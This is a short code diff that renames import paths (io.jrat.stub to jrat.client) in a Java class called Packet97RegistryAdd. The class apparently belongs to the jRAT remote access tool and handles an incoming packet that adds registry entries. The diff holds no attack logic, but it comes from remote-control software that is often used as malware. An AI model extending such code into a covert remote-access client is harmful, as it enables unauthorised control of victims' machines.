@@ -1,7 +1,7 @@
 package jrat.module.registry;
 
-import io.jrat.stub.Connection;
-import io.jrat.stub.packets.incoming.AbstractIncomingPacket;
+import jrat.client.Connection;
+import jrat.client.packets.incoming.AbstractIncomingPacket;
 import oslib.OperatingSystem;
 
 public class Packet97RegistryAdd extends AbstractIncomingPacket {
